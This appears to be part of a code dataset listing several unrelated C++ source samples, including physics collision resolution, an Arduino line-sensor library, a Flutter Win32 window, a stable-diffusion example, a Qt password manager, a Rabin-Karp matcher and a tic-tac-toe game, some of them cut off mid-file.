normal,float depth){\n            if (body1.isStaticBody())\n                body2.Move(Vector2Scale(normal, -depth));\n            else if (body2.isStaticBody())\n                body1.Move(Vector2Scale(normal, depth));\n            else {\n                body1.Move(Vector2Scale(normal, depth / 2));\n                body2.Move(Vector2Scale(normal, -depth / 2));\n            }\n}\n\nvoid World::ResolveCollision(CollisionManifold& manifold) {\n    Body2D& body1 = manifold.bodyA;\n    Body2D& body2 = manifold.bodyB;\n    Vector2 normal = manifold.normal;\n    if (body1.isStaticBody() && body2.isStaticBody()) return;\n    Vector2 velocity1 = body1.getVelocity();\n    Vector2 velocity2 = body2.getVelocity();\n    Vector2 relativeVelocity = Vector2Subtract(velocity1, velocity2);\n    float velocityAlongNormal = Vector2DotProduct(relativeVelocity, normal);\n    if (velocityAlongNormal > 0) return;\n    float e = std::min(body1.getRestitution(), body2.getRestitution());\n    float j = -(1.0f + e) * velocityAlongNormal;\n    j /= (body1.getInvMass() + body2.getInvMass());\n    body1.setVelocity(Vector2Add(velocity1, Vector2Scale(normal, j * body1.getInvMass())));\n    body2.setVelocity(Vector2Subtract(velocity2, Vector2Scale(normal, j * body2.getInvMass())));\n}\n\nvoid World::ResolveCollisionRotation(CollisionManifold& manifold){\n       Body2D& body1 = manifold.bodyA;\n    Body2D& body2 = manifold.bodyB;\n    Vector2 normal = manifold.normal;\n    int ContactCount=manifold.Count;\n    Vector2 ContactList[2]={manifold.Point1,manifold.Point2};\n    Vector2 ImplseList[2]={{0,0},{0,0}};\n    Vector2 RA[2]={{0,0},{0,0}};\n    Vector2 RB[2]={{0,0},{0,0}};\n    float e = std::min(body1.getRestitution(), body2.getRestitution());\n    for(int i=0;i<ContactCount;i++){\n        Vector2 ra=Vector2Subtract(ContactList[i],body1.getPosition());\n        Vector2 rb=Vector2Subtract(ContactList[i],body2.getPosition());\n        Vector2 raPerp={-ra.y,ra.x};\n        Vector2 rbPerp={-rb.y,rb.x};\n        RA[i]=ra;\n        RB[i]=rb;\n        Vector2 angularLinearVelocityA=Vector2Scale(raPerp,body1.getRotationalVelocity());\n        Vector2 angularLinearVelocityB=Vector2Scale(rbPerp,body2.getRotationalVelocity());\n        Vector2 RelativeVelocity=Vector2Subtract\n                                (Vector2Add(body1.getVelocity(),angularLinearVelocityA), \n                                Vector2Add(body2.getVelocity(),angularLinearVelocityB));\n        float ContactVelocity=Vector2DotProduct(RelativeVelocity,normal);\n        if(ContactVelocity>0) continue;\n        float raPerpDotN=Vector2DotProduct(raPerp,normal);\n        float rbPerpDotN=Vector2DotProduct(rbPerp,normal);\n        float Denominator=(body1.getInvMass()+body2.getInvMass())+\n                     (raPerpDotN*raPerpDotN*body1.getInvInertia())+\n                    (rbPerpDotN*rbPerpDotN*body2.getInvInertia());\n         float j = -(1.0f + e) * ContactVelocity;\n    j /= Denominator;\n    Vector2 Impulse=Vector2Scale(normal,j);\n    ImplseList[i]=Impulse;        \n}\n    for(int i=0;i<ContactCount;i++){\n",
    "#include \"QTRSensors.h\"\n#include <Arduino.h>\n\nvoid QTRSensors::setTypeRC()\n{\n  _type = QTRType::RC;\n  _maxValue = _timeout;\n}\n\nvoid QTRSensors::setTypeAnalog()\n{\n  _type = QTRType::Analog;\n  _maxValue = 1023; // Arduino analogRead() returns a 10-bit value by default\n}\n\nvoid QTRSensors::setSensorPins(const uint8_t * pins, uint8_t sensorCount)\n{\n  if (sensorCount > QTRMaxSensors) { sensorCount = QTRMaxSensors; }\n\n  // (Re)allocate and initialize the array if necessary.\n  uint8_t * oldSensorPins = _sensorPins;\n  _sensorPins = (uint8_t *)realloc(_sensorPins, sizeof(uint8_t) * sensorCount);\n  if (_sensorPins == nullptr)\n  {\n    // Memory allocation failed; don't continue.\n    free(oldSensorPins); // deallocate any memory used by old array\n    return;\n  }\n\n  for (uint8_t i = 0; i < sensorCount; i++)\n  {\n    _sensorPins[i] = pins[i];\n  }\n\n  _sensorCount = sensorCount;\n\n  // Any previous calibration values are no longer valid, and the calibration\n  // arrays might need to be reallocated if the sensor count was changed.\n  calibrationOn.initialized = false;\n  calibrationOff.initialized = false;\n}\n\nvoid QTRSensors::setTimeout(uint16_t timeout)\n{\n  if (timeout > 32767) { timeout = 32767; }\n  _timeout = timeout;\n  if (_type == QTRType::RC) { _maxValue = timeout; }\n}\n\nvoid QTRSensors::setSamplesPerSensor(uint8_t samples)\n{\n  if (samples > 64) { samples = 64; }\n  _samplesPerSensor = samples;\n}\n\nvoid QTRSensors::setEmitterPin(uint8_t emitterPin)\n{\n  releaseEmitterPins();\n\n  _oddEmitterPin = emitterPin;\n  pinMode(_oddEmitterPin, OUTPUT);\n\n  _emitterPinCount = 1;\n}\n\nvoid QTRSensors::setEmitterPins(uint8_t oddEmitterPin, uint8_t evenEmitterPin)\n{\n  releaseEmitterPins();\n\n  _oddEmitterPin = oddEmitterPin;\n  _evenEmitterPin = evenEmitterPin;\n  pinMode(_oddEmitterPin, OUTPUT);\n  pinMode(_evenEmitterPin, OUTPUT);\n\n  _emitterPinCount = 2;\n}\n\nvoid QTRSensors::releaseEmitterPins()\n{\n  if (_oddEmitterPin != QTRNoEmitterPin)\n  {\n    pinMode(_oddEmitterPin, INPUT);\n    _oddEmitterPin = QTRNoEmitterPin;\n  }\n\n  if (_evenEmitterPin != QTRNoEmitterPin)\n  {\n    pinMode(_evenEmitterPin, INPUT);\n    _evenEmitterPin = QTRNoEmitterPin;\n  }\n\n  _emitterPinCount = 0;\n}\n\nvoid QTRSensors::setDimmingLevel(uint8_t dimmingLevel)\n{\n  if (dimmingLevel > 31) { dimmingLevel = 31; }\n  _dimmingLevel = dimmingLevel;\n}\n\n// emitters defaults to QTREmitters::All; wait defaults to true\nvoid QTRSensors::emittersOff(QTREmitters emitters, bool wait)\n{\n  bool pinChanged = false;\n\n  // Use odd emitter pin in these cases:\n  // - 1 emitter pin, emitters = all\n  // - 2 emitter pins, emitters = all\n  // - 2 emitter pins, emitters = odd\n  if (emitters == QTREmitters::All ||\n      (_emitterPinCount == 2 && emitters == QTREmitters::Odd))\n  {\n    // Check if pin is defined and only turn off if not already off\n    if ((_oddEmitterPin != QTRNoEmitterPin) &&\n        (digitalRead(_oddEmitterPin) == HIGH))\n    {\n      digitalWrite(_oddEmitterPin, LOW);\n      pinChanged = true;\n    }\n  }\n\n  // Use even emitter pin in these cases:\n  // - 2 emitter pins, emitters = all\n  // - 2 emitter pins, emitters = even\n  if (_emitterPinCount == 2 &&\n      (emitters == QTREmitters::All || emitters == QTREmitters::Even))\n  {\n    // Check if pin is defined and only turn off if not already off\n    if ((_evenEmitterPin != QTRNoEmitterPin) &&\n        (digitalRead(_evenEmitterPin) == HIGH))\n    {\n      digitalWrite(_evenEmitterPin, LOW);\n      pinChanged = true;\n    }\n  }\n\n  if (wait && pinChanged)\n  {\n    if (_dimmable)\n    {\n      // driver min is 1 ms\n      delayMicroseconds(1200);\n    }\n    else\n    {\n      delayMicroseconds(200);\n    }\n  }\n}\n\nvoid QTRSensors::emittersOn(QTREmitters emitters, bool wait)\n{\n  bool pinChanged = false;\n  uint16_t emittersOnStart;\n\n  // Use odd emitter pin in these cases:\n  // - 1 emitter pin, emitters = all\n  // - 2 emitter pins, emitters = all\n  // - 2 emitter pins, emitters = odd\n  if (emitters == QTREmitters::All ||\n      (_emitterPinCount == 2 && emitters == QTREmitters::Odd))\n  {\n    // Check if pin is defined, and only turn on non-dimmable sensors if not\n    // already on, but always turn dimmable sensors off and back on because\n    // we might be changing the dimming level (emittersOnWithPin() should take\n    // care of this)\n    if ((_oddEmitterPin != QTRNoEmitterPin) &&\n        ( _dimmable || (digitalRead(_oddEmitterPin) == LOW)))\n    {\n      emittersOnStart = emittersOnWithPin(_oddEmitterPin);\n      pinChanged = true;\n    }\n  }\n\n  // Use even emitter pin in these cases:\n  // - 2 emitter pins, emitters = all\n  // - 2 emitter pins, emitters = even\n  if (_emitterPinCount == 2 &&\n      (emitters == QTREmitters::All || emitters == QTREmitters::Even))\n  {\n    // Check if pin is defined, and only turn on non-dimmable sensors if not\n    // already on, but always turn dimmable sensors off and back on because\n    // we might be changing the dimming level (emittersOnWithPin() should take\n    // care of this)\n    if ((_evenEmitterPin != QTRNoEmitterPin) &&\n        (_dimm",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"stable-diffusion.h\"\n#include <iostream>\n\nconst int MIN_LOG_LEVEL = SD_LOG_DEBUG;\nconst bool COLOR_LOGGING = true;\n\n/* Enables Printing the log level tag in color using ANSI escape codes */\nvoid sd_log_cb(enum sd_log_level_t level, const char* log, void* data) {\n    int tag_color;\n    const char* level_str;\n    FILE* out_stream = (level == SD_LOG_ERROR) ? stderr : stdout;\n\n    if (!log || level < MIN_LOG_LEVEL) {\n        return;\n    }\n\n    switch (level) {\n        case SD_LOG_DEBUG:\n            tag_color = 37;\n            level_str = \"DEBUG\";\n            break;\n        case SD_LOG_INFO:\n            tag_color = 34;\n            level_str = \"INFO\";\n            break;\n        case SD_LOG_WARN:\n            tag_color = 35;\n            level_str = \"WARN\";\n            break;\n        case SD_LOG_ERROR:\n            tag_color = 31;\n            level_str = \"ERROR\";\n            break;\n        default: /* Potential future-proofing */\n            tag_color = 33;\n            level_str = \"?????\";\n            break;\n    }\n\n    if (COLOR_LOGGING) {\n        fprintf(out_stream, \"\\033[%d;1m[%-5s]\\033[0m \", tag_color, level_str);\n    } else {\n        fprintf(out_stream, \"[%-5s] \", level_str);\n    }\n    fputs(log, out_stream);\n    fflush(out_stream);\n}\n\nint main(int argc, char* argv[]) {\n    sd_set_log_callback(sd_log_cb, NULL);\n\n    // Define paths for model files\n    const char* model_path = \"F:\\\\models\\\\stable-diffusion\\\\sd-v1-5.safetensors\";\n    // const char* model_path = \"F:\\\\ED4\\\\server\\\\miniSD.ckpt\";\n    const char* clip_l_path = \"\";\n    const char* t5xxl_path = \"\";\n    const char* diffusion_model_path = \"\";\n    const char* vae_path = \"\";\n    const char* taesd_path = \"\";\n    const char* control_net_path = \"\";\n    const char* lora_model_dir = \"\";\n    const char* embed_dir = \"\";\n    const char* stacked_id_embed_dir = \"\";\n\n    // Create the Stable Diffusion context\n    sd_ctx_t* ctx = new_sd_ctx(model_path, clip_l_path, t5xxl_path, diffusion_model_path,\n                               vae_path, taesd_path, control_net_path, lora_model_dir,\n                               embed_dir, stacked_id_embed_dir, false, false, false,\n                               -1, SD_TYPE_F16, STD_DEFAULT_RNG, DEFAULT, false, false, false);\n\n    if (ctx == NULL) {\n        std::cerr << \"Failed to create Stable Diffusion context.\" << std::endl;\n        return -1;\n    }\n\n    std::cout<<\"Made the context\";\n\n    // Generate image using txt2img\n    const char* prompt = \"A beautiful landscape painting\";\n    const char* negative_prompt = \"\";\n    sd_image_t* image = txt2img(ctx, prompt, negative_prompt, 0, 7.5f, 1.0f, 512, 512,\n                                EULER_A, 25, 42, 1, NULL, 0.0f, 0.0f, false, \"\");\n                              \n    if (image == NULL) {\n        std::cerr << \"txt2img failed.\" << std::endl;\n        free_sd_ctx(ctx);\n        return -1;\n    }\n\n    // Output image details\n    std::cout << \"Generated image: \" << image->width << \"x\" << image->height << std::endl;\n\n    return 0;\n}",
    "#include <QApplication>\n#include <QWidget>\n#include <QVBoxLayout>\n#include <QLabel>\n#include <QLineEdit>\n#include <QPushButton>\n#include <QListWidget>\n#include <QDir>\n#include <QFile>\n#include <QClipboard>\n#include <QHBoxLayout>\n#include <QDialog>\n#include <openssl/evp.h>\n#include <openssl/rand.h>\n#include <openssl/aes.h>\n\nclass SifreDuzenleDialog : public QDialog {\n    Q_OBJECT\n\npublic:\n    SifreDuzenleDialog(const QString &site, const QString &sifre, QWidget *parent = nullptr)\n    : QDialog(parent), orijinalSite(site) {\n        QVBoxLayout *duzenLayout = new QVBoxLayout(this);\n\n        QLabel *siteLabel = new QLabel(\"Sifre Adi:\");\n        duzenLayout->addWidget(siteLabel);\n        siteGirisi = new QLineEdit(this);\n        siteGirisi->setText(site);\n        duzenLayout->addWidget(siteGirisi);\n\n        QLabel *sifreLabel = new QLabel(\"Sifre:\");\n        duzenLayout->addWidget(sifreLabel);\n        sifreGirisi = new QLineEdit(this);\n        sifreGirisi->setText(sifre);\n        sifreGirisi->setEchoMode(QLineEdit::Password);\n        duzenLayout->addWidget(sifreGirisi);\n\n        QPushButton *kaydetButton = new QPushButton(\"Kaydet\", this);\n        duzenLayout->addWidget(kaydetButton);\n\n        connect(kaydetButton, &QPushButton::clicked, this, &SifreDuzenleDialog::accept);\n        setLayout(duzenLayout);\n    }\n\n    QString siteAl() const { return siteGirisi->text(); }\n    QString sifreAl() const { return sifreGirisi->text(); }\n\nprivate:\n    QLineEdit *siteGirisi;\n    QLineEdit *sifreGirisi;\n    QString orijinalSite;\n};\n\nclass SifreYonetici : public QWidget {\n    Q_OBJECT\n\npublic:\n    SifreYonetici() {\n        QVBoxLayout *anaLayout = new QVBoxLayout(this);\n\n        QHBoxLayout *butonLayout = new QHBoxLayout();\n        QPushButton *ekleButton = new QPushButton(\"Ekle\", this);\n        QPushButton *kopyalaButton = new QPushButton(\"Kopyala\", this);\n        QPushButton *silButton = new QPushButton(\"Sil\", this);\n        QPushButton *duzenleButton = new QPushButton(\"Duzenle\", this);\n        butonLayout->addWidget(ekleButton);\n        butonLayout->addWidget(kopyalaButton);\n        butonLayout->addWidget(silButton);\n        butonLayout->addWidget(duzenleButton);\n        anaLayout->addLayout(butonLayout);\n\n        QLabel *siteLabel = new QLabel(\"Site Adi:\");\n        anaLayout->addWidget(siteLabel);\n        siteGirisi = new QLineEdit(this);\n        anaLayout->addWidget(siteGirisi);\n\n        QLabel *sifreLabel = new QLabel(\"Sifre:\");\n        anaLayout->addWidget(sifreLabel);\n        sifreGirisi = new QLineEdit(this);\n        sifreGirisi->setEchoMode(QLineEdit::Password);\n        anaLayout->addWidget(sifreGirisi);\n\n        sifreListesi = new QListWidget(this);\n        anaLayout->addWidget(sifreListesi);\n\n        connect(ekleButton, &QPushButton::clicked, this, &SifreYonetici::sifreEkle);\n        connect(kopyalaButton, &QPushButton::clicked, this, &SifreYonetici::sifreKopyala);\n        connect(silButton, &QPushButton::clicked, this, &SifreYonetici::sifreSil);\n        connect(duzenleButton, &QPushButton::clicked, this, &SifreYonetici::sifreDuzenle);\n\n        anahtarYukleVeyaOlustur();\n        sifreleriYukle();\n\n        setLayout(anaLayout);\n        setWindowTitle(\"Sifre Yonetici\");\n\n        QDir dizin(\"pass\");\n        if (!dizin.exists()) {\n            dizin.mkpath(\".\");\n        }\n    }\n\nprivate slots:\n    void sifreEkle() {\n        QString site = siteGirisi->text();\n        QString sifre = sifreGirisi->text();\n        if (!site.isEmpty() && !sifre.isEmpty()) {\n            if (!sifreMevcutMu(site)) {\n                QString sifrelenmisSifre = sifreSifrele(sifre);\n                sifreyiKaydet(site, sifrelenmisSifre);\n                siteGirisi->clear();\n                sifreGirisi->clear();\n                sifreleriYukle();\n            }\n        }\n    }\n\n    void sifreDuzenle() {\n        QListWidgetItem *oge = sifreListesi->currentItem();\n        if (oge) {\n            QString site = oge->text().split(\":\").first();\n            QByteArray sifrelenmisSifre = sifreyiYukle(site);\n            QString cozulenSifre = sifreCoze(sifrelenmisSifre);\n\n            SifreDuzenleDialog dialog(site, cozulenSifre, this);\n            if (dialog.exec() == QDialog::Accepted) {\n                QString yeniSite = dialog.siteAl();\n                QString yeniSifre = dialog.sifreAl();\n\n                if (yeniSite != site && !sifreMevcutMu(yeniSite)) {\n                    QString yeniSifrelenmisSifre = sifreSifrele(yeniSifre);\n                    QFile::remove(\"pass/\" + site + \".txt\");\n                    sifreyiKaydet(yeniSite, yeniSifrelenmisSifre);\n                    sifreleriYukle();\n                } else if (yeniSite == site) {\n                    QString yeniSifrelenmisSifre = sifreSifrele(yeniSifre);\n                    sifreyiKaydet(site, yeniSifrelenmisSifre);\n                    sifreleriYukle();\n                }\n            }\n        }\n    }\n\n    void sifreSil() {\n        QListWidgetItem *oge = sifreListesi->currentItem();\n        if (oge) ",
    "#include <iostream>\r\n#include <vector>\r\n#include <cmath>\r\n#include <random>\r\n#include <algorithm>\r\n\r\nusing namespace std;\r\n\r\n// To generate (a raise to power b) % q, here a and b are non-negative integers and q is a prime number\r\nlong long power(long long a, long long b, long long q) {\r\n    if (b == 0)\r\n        return 1;\r\n    else {\r\n        if (b % 2 == 0)\r\n            return ((power(a, b / 2, q) % q) * (power(a, b / 2, q) % q)) % q;\r\n        else\r\n            return (a * (power(a, (b - 1) / 2, q) % q) * (power(a, (b - 1) / 2, q) % q)) % q;\r\n    }\r\n}\r\n\r\n// To check if a number is prime\r\nbool isPrime(long long q) {\r\n    if (q > 1) {\r\n        for (long long i = 2; i <= sqrt(q); ++i) {\r\n            if (q % i == 0)\r\n                return false;\r\n        }\r\n        return true;\r\n    }\r\n    return false;\r\n}\r\n\r\n// To generate random prime less than N\r\nlong long randPrime(long long N) {\r\n    vector<long long> primes;\r\n    for (long long q = 2; q <= N; ++q) {\r\n        if (isPrime(q))\r\n            primes.push_back(q);\r\n    }\r\n    random_device rd;\r\n    mt19937 gen(rd());\r\n    uniform_int_distribution<> dis(0, primes.size() - 1);\r\n    return primes[dis(gen)];\r\n}\r\n\r\n// Return appropriate N that satisfies the error bounds\r\nlong long findN(double eps, long long m) {\r\n    eps = min(eps, 0.01);\r\n    long long rootN = static_cast<long long>(11 * m / eps);\r\n    return rootN * rootN;\r\n}\r\n\r\n// Return sorted list of starting indices where p matches x\r\nvector<long long> modPatternMatch(long long q, const string& p, const string& x) {\r\n    long long m = p.length();\r\n    long long n = x.length();\r\n    long long pow = power(26, m - 1, q);\r\n    long long pmod = 0;\r\n    long long xmod = 0;\r\n\r\n    for (long long i = 0; i < m; ++i) {\r\n        pmod = (26 * pmod + (p[i] - 'A')) % q;\r\n        xmod = (26 * xmod + (x[i] - 'A')) % q;\r\n    }\r\n\r\n    vector<long long> ans;\r\n    for (long long i = 0; i <= n - m; ++i) {\r\n        if (pmod == xmod) {\r\n            ans.push_back(i);\r\n        }\r\n        if (i + m < n) {\r\n            xmod = (26 * (xmod - (x[i] - 'A') * pow) + (x[i + m] - 'A')) % q;\r\n            if (xmod < 0) xmod += q;\r\n        }\r\n    }\r\n    return ans;\r\n}\r\n\r\n// Return sorted list of starting indices where p matches x with wildcard\r\nvector<long long> modPatternMatchWildcard(long long q, const string& p, const string& x) {\r\n    long long m = p.length();\r\n    long long n = x.length();\r\n    long long wild_index = p.find('?');\r\n    long long pow = power(26, m - 1, q);\r\n    long long pmod = 0;\r\n    long long xmod = 0;\r\n\r\n    for (long long i = 0; i < m; ++i) {\r\n        if (p[i] == '?') {\r\n            pmod = (26 * pmod) % q;\r\n            xmod = (26 * xmod) % q;\r\n        } else {\r\n            pmod = (26 * pmod + (p[i] - 'A')) % q;\r\n            xmod = (26 * xmod + (x[i] - 'A')) % q;\r\n        }\r\n    }\r\n\r\n    vector<long long> ans;\r\n    long long pow2 = power(26, m - wild_index - 1, q);\r\n    for (long long i = 0; i <= n - m; ++i) {\r\n        if (pmod == xmod) {\r\n            ans.push_back(i);\r\n        }\r\n        if (i + m < n) {\r\n            xmod = (26 * (xmod + (x[i + wild_index] - 'A') * pow2 - (x[i] - 'A') * pow) + \r\n                    (x[i + m] - 'A') - (x[i + wild_index + 1] - 'A') * pow2) % q;\r\n            if (xmod < 0) xmod += q;\r\n        }\r\n    }\r\n    return ans;\r\n}\r\n\r\n// Pattern matching\r\nvector<long long> randPatternMatch(double eps, const string& p, const string& x) {\r\n    long long N = findN(eps, p.length());\r\n    long long q = randPrime(N);\r\n    return modPatternMatch(q, p, x);\r\n}\r\n\r\n// Pattern matching with wildcard\r\nvector<long long> randPatternMatchWildcard(double eps, const string& p, const string& x) {\r\n    long long N = findN(eps, p.length());\r\n    long long q = randPrime(N);\r\n    return modPatternMatchWildcard(q, p, x);\r\n}\r\n\r\nint main() {\r\n    // Example usage\r\n    vector<long long> result = modPatternMatchWildcard(1000000007, \"?A\", \"ABCDE\");\r\n    for (long long index : result) {\r\n        cout << index << \" \";\r\n    }\r\n    cout << endl;\r\n    return 0;\r\n}\r\n\r\n",
    "#include <iostream>\n\nvoid updateBoard(char *spaces);\nvoid playerMove(char *spaces, char pMove);\nvoid computerMove(char *spaces, char cMove);\nbool isTie(char *spaces);\nbool isWin(char *spaces, char pMove);\n\nint main(){\n    char spaces[9] = {' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '};\n    char pMove = 'X';\n    char cMove = 'O';\n    char temp[9] = {'a','b','c','d','e','f','g','h','i'};\n\n    std::cout << \"--------- Tic Tac Toe Game START ---------\\n\";\n    std::cout << \"           Press Ctrl+C to End\\n\";\n    updateBoard(spaces);\n    while(true){\n        \n        playerMove(spaces, pMove);\n        updateBoard(spaces);\n        if(isWin(spaces, pMove) == true || isTie(spaces) == true){\n            break;\n        }\n        computerMove(spaces,cMove);\n        updateBoard(spaces);\n        if(isWin(spaces, pMove) == true || isTie(spaces) == true){\n            break;\n        }\n        \n    }\n\n    return 0;\n}\n\nvoid updateBoard(char *spaces){\n    std::cout << \"             \" << \"     |     |     \\n\";\n    std::cout << \"             \" << \"  \" << spaces[0] << \"  |  \" << spaces[1] << \"  |  \" << spaces[2] << \"  \\n\";\n    std::cout << \"             \" << \"_____|_____|_____\\n\";\n    std::cout << \"             \" << \"     |     |     \\n\";\n    std::cout << \"             \" << \"  \" << spaces[3] << \"  |  \" << spaces[4] << \"  |  \" << spaces[5] << \"  \\n\";\n    std::cout << \"             \" << \"_____|_____|_____\\n\";\n    std::cout << \"             \" << \"     |     |     \\n\";\n    std::cout << \"             \" << \"  \" << spaces[6] << \"  |  \" << spaces[7] << \"  |  \" << spaces[8] << \"  \\n\";\n    std::cout << \"             \" << \"     |     |     \\n\\n\";\n}\nvoid playerMove(char *spaces, char pMove){\n    int number=-1;\n    while(number<1 || number>9){\n        std::cout<< \"Enter a number between 1-9: \";\n        std::cin >> number;\n    }\n    number--;\n    if(spaces[number] == ' '){\n        spaces[number] = pMove;\n    } else {\n        std::cout << \"[Spaces already taken]\" << '\\n';\n        playerMove(spaces, pMove);\n    }\n    \n}\nvoid computerMove(char *spaces, char cMove){\n    srand(time(0));\n    int num = 0;\n    while(true){\n        num = rand() % 9;\n        if(spaces[num] == ' '){\n            spaces[num] = cMove;\n            break;\n        }\n        if(isTie(spaces) == true){\n            break;\n        }\n    }\n}\nbool isTie(char *spaces){\n    for(int i=0;i<9;i++){           // Cant use (sizeof(spaces)/sizeof(spaces[0])) for length of array because sizeof would take the size of the POINTER to the array, not the size of the array itself :(\n        if(spaces[i] == ' '){\n            return false;\n        }\n    }\n    std::cout << \"It's a tie!\\n\";\n    return true;\n}\nbool isWin(char *spaces, char pMove){\n    if((spaces[0] != ' ') && (spaces[0] == spaces[1]) && (spaces[1] == spaces[2])){\n        spaces[0] == pMove ? std::cout << \"You win!\\n\" : std::cout << \"You lose :(\\n\";\n        return true;\n    } else if((spaces[3] != ' ') && (spaces[3] == spaces[4]) && (spaces[4] == spaces[5])){\n        spaces[3] == pMove ? std::cout << \"You win!\\n\" : std::cout << \"You lose :(\\n\";\n        return true;\n    } else if((spaces[6] != ' ') && (spaces[6] == spaces[7]) && (spaces[7] == spaces[8])){\n        spaces[6] == pMove ? std::cout << \"You win!\\n\" : std::cout << \"You lose :(\\n\";\n        return true;\n    } else if((spaces[0] != ' ') && (spaces[0] == spaces[3]) && (spaces[3] == spaces[6])){\n        spaces[0] == pMove ? std::cout << \"You win!\\n\" : std::cout << \"You lose :(\\n\";\n        return true;\n    } else if((spaces[1] != ' ') && (spaces[1] == spaces[4]) && (spaces[4] == spaces[7])){\n        spaces[1] == pMove ? std::cout << \"You win!\\n\" : std::cout << \"You lose :(\\n\";\n        return true;\n    } else if((spaces[2] != ' ') && (spaces[2] == spaces[5]) && (spaces[5] == spaces[8])){\n        spaces[2] == pMove ? std::cout << \"You win!\\n\" : std::cout << \"You lose :(\\n\";\n        return true;\n    } else if((spaces[0] != ' ') && (spaces[0] == spaces[4]) && (spaces[4] == spaces[8])){\n        spaces[0] == pMove ? std::cout << \"You win!\\n\" : std::cout << \"You lose :(\\n\";\n        return true;\n    } else if((spaces[2] != ' ') && (spaces[2] == spaces[4]) && (spaces[4] == spaces[6])){\n        spaces[2] == pMove ? std::cout << \"You win!\\n\" : std::cout << \"You lose :(\\n\";\n        return true;\n    } \n    return false;\n}",
